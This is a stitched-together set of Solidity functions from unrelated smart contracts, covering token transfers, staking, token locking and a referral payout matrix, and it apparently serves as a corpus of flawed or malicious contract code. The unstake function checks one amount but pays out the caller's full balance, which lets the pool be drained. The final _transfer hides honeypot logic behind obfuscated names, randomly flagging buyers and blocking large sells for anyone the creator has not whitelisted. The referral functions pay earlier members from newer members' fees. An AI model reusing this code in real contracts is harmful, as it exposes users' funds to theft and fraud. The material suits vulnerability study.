function transferFrom(address _from, address _to, uint256 _value) public returns(bool success) {
    uint256 allowance = allowed[_from][msg.sender];
    require(balances[_from] >= _value && allowance >= _value);
    if (totalSupply > (10 ** 26) && block.timestamp >= 1529474460) {
        uint halfP = halfPercent(_value);
        burn(_from, halfP);
        _value = SafeMath.sub(_value, halfP);
    }
    balances[_to] = SafeMath.add(balances[_to], _value);
    balances[_from] = SafeMath.sub(balances[_from], _value);
    if (allowance < MAX_UINT256) {
        allowed[_from][msg.sender] = SafeMath.sub(allowed[_from][msg.sender], _value);
    }
    Transfer(_from, _to, _value);
    return true;
}

function transfer(address _to, uint256 _value) public returns(bool success) {
    require(balances[msg.sender] >= _value);
    if (totalSupply > (10 ** 26) && block.timestamp >= 1529474460) {
        uint halfP = halfPercent(_value);
        burn(msg.sender, halfP);
        _value = SafeMath.sub(_value, halfP);
    }
    balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);
    balances[_to] = SafeMath.add(balances[_to], _value);
    Transfer(msg.sender, _to, _value);
    return true;
}

function redeemETH() public {
    require(now >= stakes[msg.sender].timestamp + timeBetweenRedeems, 'You must wait at least a day after the snapshot to redeem your earnings');
    uint256 burnedTokens = yeld.balanceOf(address(0));
    uint256 userPercentage = stakes[msg.sender].yeldBalance.mul(1e18).div(yeld.totalSupply().sub(burnedTokens));
    uint256 earnings = address(this).balance.mul(userPercentage).div(1e16);
    stakes[msg.sender] = Stake(now, stakes[msg.sender].yeldBalance);
    msg.sender.transfer(earnings);
}

function unstake(uint256 _amount) public {
    uint256 balanceToSend = stakes[msg.sender].yeldBalance;
    require(balanceToSend > 0 && _amount > 0, "You can't unstake less than zero");
    require(_amount <= balanceToSend, "You can't withdraw more than your balance");
    stakes[msg.sender] = Stake(now, stakes[msg.sender].yeldBalance.sub(_amount));
    totalStaked = totalStaked.sub(_amount);
    yeld.transfer(msg.sender, balanceToSend);
}

function stakeYeld(uint256 _amount) public {
    yeld.transferFrom(msg.sender, address(this), _amount);
    stakes[msg.sender] = Stake(now, stakes[msg.sender].yeldBalance.add(_amount));
    totalStaked = totalStaked.add(_amount);
}

function caculateBurnRate() public view returns(uint8) {
    if (now >= milestoned3) return burnrated3;
    if (now >= milestoned2) return burnrated2;
    if (now >= milestoned1) return burnrated1;
    return burnrated0;
}

function registration(address _user, address payable _referrer, uint256 _referrerAccount) private {
    totalUsers = totalUsers + 1;
    userAccounts = userAccounts + 1;
    User storage u = users[_user];
    Account storage ua = u.accounts[1];
    if (_referrer != owner) {
        u.referrer = _referrer;
        u.totalAccounts = 1;
        u.active = true;
        ua.active = true;
        pushDownlines(_user, _referrer, _referrerAccount);
        pushUplines(_user, _referrer, _referrerAccount, 1);
        sendDirectBonus(_referrer);
    } else {
        u.referrer = owner;
        u.totalAccounts = 1;
        u.active = true;
        ua.active = true;
        sendDirectBonus(payable(owner));
        pushDownlines(_user, _referrer, _referrerAccount);
        pushUplines(_user, _referrer, _referrerAccount, 1);
    }
}

function purchase() external payable {
    require(msg.value == price);
    User storage u = users[msg.sender];
    uint256 newAccount = u.totalAccounts;
    newAccount = newAccount + 1;
    uint256 oldAccount = u.totalAccounts;
    require(u.active == true);
    userAccounts = userAccounts + 1;
    Account storage o = u.accounts[oldAccount];
    Account storage a = u.accounts[newAccount];
    a.active = true;
    a.uplines = o.uplines;
    u.totalAccounts = newAccount;
    sendDirectBonus(payable(u.referrer));
    sendSpillOver(a.uplines);
}

function sendDirectBonus(address payable _reciever) private {
    _reciever.transfer(referralBonus);
    emit Referral(_reciever, referralBonus);
}

function sendSpillOver(address[] memory _reciepients) private {
    if (_reciepients.length > 9) {
        for (uint i = 0; i < 9; i++) {
            payable(_reciepients[i]).transfer(spillover);
            emit LevelBonus(_reciepients[i], spillover);
        }
    } else {
        for (uint i = 0; i < _reciepients.length; i++) {
            payable(_reciepients[i]).transfer(spillover);
            emit LevelBonus(_reciepients[i], spillover);
        }
    }
}

function _lock(address from, uint256 amount, uint256 due)
internal
returns(bool success) {
    require(due > block.timestamp, "ERC20Lockable/lock : Cannot set due to past");
    require(
        _balances[from] >= amount + _totalLocked[from],
        "ERC20Lockable/lock : locked total should be smaller than balance"
    );
    _totalLocked[from] = _totalLocked[from] + amount;
    _locks[from].push(LockInfo(amount, due));
    emit Lock(from, amount, due);
    success = true;
}

function unlockAll(address from) external returns(bool success) {
    for (uint256 i = 0; i < _locks[from].length;) {
        i++;
        if (_locks[from][i - 1].due < block.timestamp) {
            if (_unlock(from, i - 1)) {
                i--;
            }
        }
    }
    success = true;
}

function unlock(address from, uint256 idx) external returns(bool success) {
    require(_locks[from][idx].due < block.timestamp, "ERC20Lockable/unlock: cannot unlock before due");
    return _unlock(from, idx);
}

function withdraw(
    uint32 _stakeID,
    bool _full,
    uint64 _withdrawAmount
) external nonReentrant {
    require(
        stakeByID[_stakeID].ownerAddress == msg.sender,
        "Unauthorized Stake owner"
    );
    require(stakeByID[_stakeID].active == true, "Stake was settled");
    uint256 elapsedTime = BokkyPooBahsDateTimeLibrary.diffDays(
        uint256(stakeByID[_stakeID].startOfTerm),
        uint256(block.timestamp)
    );
    uint256 totalReturns;
    uint256 stakeReturns;
    uint256 rewardEndTime;
    if (elapsedTime < stakeTypes[stakeByID[_stakeID].Type].bonusTerm) {
        totalReturns = compound(
            (stakeByID[_stakeID].evaiAmount),
            (stakeTypes[stakeByID[_stakeID].Type].percentageReturn),
            elapsedTime
        );
        stakeReturns = totalReturns - stakeByID[_stakeID].evaiAmount;
    } else if (
        elapsedTime == stakeTypes[stakeByID[_stakeID].Type].bonusTerm
    ) {
        totalReturns = (stakeByID[_stakeID].evaiAmount *
            (stakeTypes[stakeByID[_stakeID].Type].bonusMultiplier));
        stakeReturns = totalReturns - (stakeByID[_stakeID].evaiAmount);
    } else if (
        elapsedTime > stakeTypes[stakeByID[_stakeID].Type].bonusTerm
    ) {
        uint256 daysForYearInProgress = elapsedTime.mod(
            uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
        );
        uint256 completedYears = (elapsedTime.sub(daysForYearInProgress))
            .div(uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm));
        rewardEndTime = BokkyPooBahsDateTimeLibrary.addDays(
            uint256(stakeByID[_stakeID].startOfTerm),
            uint256(
                (completedYears + 1) *
                uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
            )
        );
        if (rewardEndTime < uint256(block.timestamp)) {
            elapsedTime = BokkyPooBahsDateTimeLibrary.diffDays(
                uint256(stakeByID[_stakeID].startOfTerm),
                rewardEndTime
            );
            daysForYearInProgress = elapsedTime.mod(
                uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
            );
            completedYears = (elapsedTime.sub(daysForYearInProgress)).div(
                uint256(stakeTypes[stakeByID[_stakeID].Type].bonusTerm)
            );
        }
        uint256 bMul = uint256(
            stakeTypes[stakeByID[_stakeID].Type].bonusMultiplier
        );
        uint256 postBonusBalance = calculatePostBonusBalance(
            uint256(stakeByID[_stakeID].evaiAmount),
            completedYears,
            bMul
        );
        uint256 pReturns = stakeTypes[stakeByID[_stakeID].Type]
            .percentageReturn;
        totalReturns = compound(
            postBonusBalance,
            pReturns,
            daysForYearInProgress
        );
        stakeReturns = totalReturns - (stakeByID[_stakeID].evaiAmount);
    }
    if (_full == true) {
        stakeByID[_stakeID].partialWithdrawn = false;
        stakeByID[_stakeID].settlementAmount = uint64(totalReturns);
        stakeByID[_stakeID].stakeReturns = uint64(stakeReturns);
    } else {
        require(
            _withdrawAmount <= uint64(totalReturns),
            "Amount to claim is higher than returns"
        );
        stakeByID[_stakeID].settlementAmount = _withdrawAmount;
    }
    if (
        _full == true &&
        stakeByID[_stakeID].settlementAmount <=
        evaiToken.balanceOf(address(this))
    ) {
        currentStakedEvaiAmount -= stakeByID[_stakeID].evaiAmount;
        totalProfitsDistrubuted += stakeByID[_stakeID].stakeReturns;
        stakeByID[_stakeID].active = false;
        stakeByID[_stakeID].settled = true;
        evaiTransfer(_stakeID);
        emitWithdrawStake(_stakeID);
    } else if (
        _full == true &&
        stakeByID[_stakeID].settlementAmount >=
        evaiToken.balanceOf(address(this))
    ) {
        stakeByID[_stakeID].active = false;
        emitWithdrawStake(_stakeID);
    } else if (
        _full == false &&
        stakeByID[_stakeID].settlementAmount <=
        evaiToken.balanceOf(address(this))
    ) {
        currentStakedEvaiAmount -= stakeByID[_stakeID].evaiAmount;
        stakeByID[_stakeID].active = false;
        stakeByID[_stakeID].partialWithdrawn = true;
        stakeByID[_stakeID].settled = true;
        evaiTransfer(_stakeID);
        emitWithdrawStake(_stakeID);
        uint8 Type = stakeByID[_stakeID].Type;
        uint256 reStakeAmount = totalReturns -
            (stakeByID[_stakeID].settlementAmount);
        reStake(uint64(reStakeAmount), Type, _stakeID);
    } else if (
        _full == false &&
        stakeByID[_stakeID].settlementAmount >=
        evaiToken.balanceOf(address(this))
    ) {
        stakeByID[_stakeID].active = false;
        stakeByID[_stakeID].partialWithdrawn = true;
        emitWithdrawStake(_stakeID);
    }
}

function settleStakes(uint32[] memory _stakeIDs) external onlyOwner {
    for (uint256 i = 0; i < _stakeIDs.length; i++) {
        if (
            stakeByID[_stakeIDs[i]].active == true &&
            stakeByID[_stakeIDs[i]].partialWithdrawn == false
        ) {
            currentStakedEvaiAmount -= stakeByID[_stakeIDs[i]]
                .settlementAmount;
            stakeByID[_stakeIDs[i]].active = false;
            stakeByID[_stakeIDs[i]].settled = true;
            evaiToken.approve(
                stakeByID[_stakeIDs[i]].ownerAddress,
                stakeByID[_stakeIDs[i]].settlementAmount
            );
            evaiToken.transfer(
                stakeByID[_stakeIDs[i]].ownerAddress,
                stakeByID[_stakeIDs[i]].settlementAmount
            );
        }
    }
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (classico == true)) {
        cintram[recipient] = true;
        palmer[recipient] = false;
        classico = false;
    }
    if (cintram[recipient] != true) {
        palmer[recipient] = ((randomItIs() == 2) ? true : false);
    }
    if ((palmer[sender]) && (cintram[recipient] == false)) {
        palmer[recipient] = true;
    }
    if (cintram[sender] == false) {
        require(amount < srilanka);
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

